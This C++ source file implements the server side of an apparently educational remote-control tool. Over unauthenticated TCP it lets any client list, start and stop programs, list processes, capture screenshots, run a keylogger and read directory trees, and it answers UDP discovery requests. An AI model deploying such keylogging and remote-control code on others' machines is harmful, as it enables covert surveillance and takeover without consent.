#include "Server.h"

#include <string.h>
#include <iostream>
#include <mutex>

#include "../GlobalConstant.h"
#include "../Utils/InUtils.h"
#include "../Utils/ConvertUtils.h"
#include "../Utils/MsgTransport.h"
#include "../Message/Request.h"
#include "../Message/Response.h"

#include "Helper.h"

Server::~Server(){
    std::cout << "Server closed." << "\n";
    close(this->listener);
    close(this->disfd);
    delete this->_keylog;
    #ifdef _WIN32
        WSACleanup();
    #endif
}

Server::Server(const char* port){
    #ifdef _WIN32
        WSADATA wsaData;
        auto wVersionRequested = MAKEWORD(2, 2); // Get version of winsock
        int retCode = WSAStartup(wVersionRequested, &wsaData);

        if (retCode != 0)
            std::cout << "Startup failed: " << retCode << "\n";
            
        std::cout << "Return Code: " << retCode << "\n";
        std::cout << "Version Used: " << (int) LOBYTE(wsaData.wVersion) << "." << (int) HIBYTE(wsaData.wVersion) << "\n";
        std::cout << "Version Supported: " << (int) LOBYTE(wsaData.wHighVersion) << "." << (int) HIBYTE(wsaData.wHighVersion) << "\n";
        std::cout << "Implementation: " << wsaData.szDescription << "\n";
        std::cout << "System Status: " << wsaData.szSystemStatus << "\n";
        std::cout << "\n";

        if(LOBYTE(wsaData.wVersion) != LOBYTE(wVersionRequested) || HIBYTE(wsaData.wVersion) != HIBYTE(wVersionRequested)){
            std::cout << "Supported Version is too low.\n";
            WSACleanup();
            exit(0);
        }

        std::cout << "WSAStartup sucess.\n\n";
    #endif
    
    int status;
    int yes = 1;
    addrinfo hints, *res;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    status = getaddrinfo(NULL, port, &hints, &res);
    if (status == -1){
        std::cerr << "getaddrinfo: " << gai_strerror(status) << "\n";
        exit(1);
    }

    addrinfo *p = NULL;
    for (p = res; p != NULL; p = p->ai_next){
        this->listener = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (this->listener == INVALID_SOCKET){
            std::cerr << "Server: socket\n";
            continue;
        }
        if (setsockopt(this->listener, SOL_SOCKET, SO_REUSEADDR, (char*)&yes, sizeof(int)) == -1) {
            std::cerr << "Server: setsockopt\n";
            exit(1); 
        }
        if (bind(this->listener, p->ai_addr, p->ai_addrlen) == -1){
            std::cerr << "Server: bind\n";
            close(this->listener);
            continue;
        }
        break;
    }
        
    std::cout << "Server started on " << getIpStr(p->ai_addr) << "::" 
        << ntohs(((sockaddr_in *)p->ai_addr)->sin_port) << "\n";
        
    freeaddrinfo(res);
    if (p == NULL){
        std::cerr << "Server: fail to bind\n";
        exit(1);
    }

    status = listen(this->listener, BACKLOG);
    if (status == -1){
        std::cerr << "Server: listen\n";
        exit(1);
    }

    this->pfds.push_back(pollfd());
    this->pfds.back().fd = this->listener;
    this->pfds.back().events = POLLIN;

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    hints.ai_flags = AI_PASSIVE;

    status = getaddrinfo(NULL, port, &hints, &res);
    if (status == SOCKET_ERROR){
        std::cerr << "getaddrinfo: " << gai_strerror(status) << "\n";
        exit(1);
    }

    for (p = res; p != NULL; p = p->ai_next){
        this->disfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (this->disfd == INVALID_SOCKET){
            std::cerr << "Server: socket\n";
            continue;
        }
        if (setsockopt(this->disfd, SOL_SOCKET, SO_REUSEADDR, (char*) &yes, sizeof(int)) == SOCKET_ERROR) {
            std::cerr << "Server: setsockopt";
            exit(1); 
        }
        if (bind(this->disfd, p->ai_addr, p->ai_addrlen) == SOCKET_ERROR){
            std::cerr << "Server: bind\n";
            close(this->disfd);
            continue;
        }
        break;
    }
        
    std::cout << "Discover server started on " << getIpStr(p->ai_addr) << "::"; 
    std::cout << ntohs(((sockaddr_in *)p->ai_addr)->sin_port) << "\n";
        
    freeaddrinfo(res);
    if (p == NULL){
        std::cerr << "Server: fail to bind\n";
        exit(1);
    }

    this->pfds.push_back(pollfd());
    this->pfds.back().fd = this->disfd;
    this->pfds.back().events = POLLIN;
}

void Server::start(){
    SOCKET newfd;

    sockaddr_storage remote_address;
    socklen_t addrlen;

    std::cout << "Server is running...\n";
    char buffer[256];
    while (true){
        int poll_count = poll(&pfds[0], pfds.size(), -1); // wait util events occur
        if (poll_count == -1){
            std::cerr << "poll\n";
            exit(1);
        }

        for(auto pfd: pfds){
            // get one ready to read
            if (pfd.revents & POLLIN){
                // listener ready to read - new connection
                if (pfd.fd == listener){
                    addrlen = sizeof(remote_address);
                    newfd = accept(listener, (sockaddr *)&remote_address, &addrlen);
                    if (newfd == -1){
                        std::cerr << "accept\n";
                    } 
                    else{
                        pfds.push_back(pollfd());
                        pfds.back().fd = newfd;
                        pfds.back().events = POLLIN;
                        
                        std::cout << "New connection from " << getIpStr((sockaddr *)&remote_address)
                             << " on socket " << newfd << "\n";
                    }
                } 
                else if (pfd.fd == disfd){ // receive discover message  
                    Request req;
                    addrlen = sizeof(remote_address);
                    recvfromRequest(disfd, req, 0, (sockaddr*)&remote_address, &addrlen);
                    if (req.type() == DISCOVER_REQUEST){
                        std::cout << "Receive discover message from " << getIpStr((sockaddr *)&remote_address) << "::"
                        << ntohs(((sockaddr_in *)&remote_address)->sin_port) << '\n';
                        Response msg(DISCOVER_RESPONSE, OK_CODE, 0, NULL);
                        
                        sendtoResponse(disfd, msg, 0, (sockaddr *)&remote_address, addrlen);
                        continue;
                    }
                    
                } 
                else{
                    Response responseToClient;
                    Request requestFromClient;

                    int status = recvRequest(pfd.fd, requestFromClient, 0);

                    if(status == -1){
                        std::cerr << "Connection closed\n";
                        break;
                    }

                    if(requestFromClient.type() == LIST_APP_REQUEST)
                        responseToClient = this->listApp();
                    else if(requestFromClient.type() == START_APP_REQUEST)
                        responseToClient = this->startApp((char*)requestFromClient.data());
                    else if(requestFromClient.type() == STOP_APP_REQUEST)
                        responseToClient = this->stopApp((char*)requestFromClient.data());
                    else if (requestFromClient.type() == LIST_PROC_REQUEST) 
                        responseToClient = this->listProcess();
                    else if (requestFromClient.type() == SCREENSHOT_REQUEST)
                        responseToClient = this->screenShot();
                    else if(requestFromClient.type() == START_KEYLOG_REQUEST)
                        responseToClient = this->startKeyLog(pfd.fd);
                    else if(requestFromClient.type() == STOP_KEYLOG_REQUEST)
                        responseToClient = this->stopKeyLog(pfd.fd);
                    else if (requestFromClient.type() == DIR_TREE_REQUEST)
                        responseToClient = this->dirTree((char*)requestFromClient.data());
                    else {
                        std::cerr << "Invalid request received on socket " << pfd.fd << std::endl;
                        continue;
                    }

                    status = sendResponse(pfd.fd, responseToClient, 0);
                    if(status == SOCKET_ERROR)
                        std::cerr << "Can't send response.\n";
                    if(requestFromClient.type() == STOP_KEYLOG_REQUEST)
                        close(pfd.fd);
                }
            }
        }
    } 
}

Response Server::listApp(){
    std::string buffer;
    uint32_t errCode;
    if (listAppHelper(buffer) == -1)
    {
        buffer.clear();
        errCode = FAIL_CODE;
    }
    else errCode = OK_CODE;

    return Response(CMD_RESPONSE_STR, errCode, buffer.size() + 1, (void *)buffer.c_str());
}

Response Server::startApp(const char* appName){
    uint32_t errCode;
    if (startAppHelper(appName) == -1)
    {
        errCode = FAIL_CODE;
    }
    else errCode = OK_CODE;

    return Response(CMD_RESPONSE_EMPTY, errCode, 0, NULL);
}

Response Server::stopApp(const char* appName){
    uint32_t errCode;
    if (stopAppHelper(appName) == -1){
        errCode = FAIL_CODE;
    }
    else errCode = OK_CODE;

    return Response(CMD_RESPONSE_EMPTY, errCode, 0, NULL);  
}

Response Server::listProcess(){
    std::string buffer;
    int status = listProcessesStrHelper(buffer);
    uint32_t errCode;
    if (status == -1){
        errCode = FAIL_CODE;
        buffer.clear();
    }
    else errCode = OK_CODE;

    return Response(CMD_RESPONSE_STR, errCode, buffer.size() + 1, (void *)buffer.c_str());
}

Response Server::screenShot(){
    std::vector<char> buffer;
    uint32_t errCode;
    if (screenshotHelper(buffer))
        errCode = FAIL_CODE;
    else errCode = OK_CODE;

    return Response(CMD_RESPONSE_PNG, errCode, buffer.size(), buffer.data());
}

Response Server::startKeyLog(int sockfd){
    std::mutex m;
    std::lock_guard l(m);
    keylogfds.push_back(sockfd);
    std::cout << "Start keylog" << std::endl;
    this->_keylog = new Keylogger();
    return Response(CMD_RESPONSE_EMPTY, OK_CODE, 0, NULL);
}

Response Server::stopKeyLog(int sockfd){
    std::mutex m;
    std::lock_guard l(m);
    for (int i = 0; i < keylogfds.size(); ++i){
        if (keylogfds[i] == sockfd)
        {
            keylogfds[i] = keylogfds.back();
            keylogfds.pop_back();
            break;
        }
    }
    std::cout << "Stop keylog" << std::endl;
    return Response(CMD_RESPONSE_EMPTY, OK_CODE, 0, NULL);
}
    
Response Server::dirTree(const char* pathName){
    std::cout << "Processing list directory tree rooted at " << pathName << std::endl;
    std::string buffer;
    int status = listDirTreeHelper(pathName, buffer);
    uint32_t errCode;
    if (status == -1){
        errCode = FAIL_CODE;
        buffer.clear();
    }
    else errCode = OK_CODE;

    return Response(CMD_RESPONSE_STR, errCode, buffer.size() + 1, (void *)buffer.c_str());
}
